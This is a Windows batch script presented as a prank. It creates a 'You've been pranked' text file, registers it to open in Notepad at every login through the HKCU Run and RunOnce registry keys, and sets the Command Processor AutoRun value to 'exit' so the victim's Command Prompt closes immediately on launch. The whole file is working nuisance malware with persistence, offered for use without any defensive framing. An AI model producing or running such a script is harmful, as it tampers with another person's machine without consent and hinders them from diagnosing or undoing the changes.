@echo off
setlocal

:: Set variables
set "DOCS=%USERPROFILE%\Documents"
set "TEXT_FILE=%DOCS%\prank.txt"
set "RUN_PATH=notepad.exe %TEXT_FILE%"
set "VALUE_NAME=GetPranked"

:: Create the prank file
echo You've been pranked > "%TEXT_FILE%"

:: Add to Startup (HKCU\Run and RunOnce)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v %VALUE_NAME% /d "%RUN_PATH%" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v %VALUE_NAME% /d "%RUN_PATH%" /f

:: Add AutoRun on Command Prompt launch
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "exit" /f

echo Done.
pause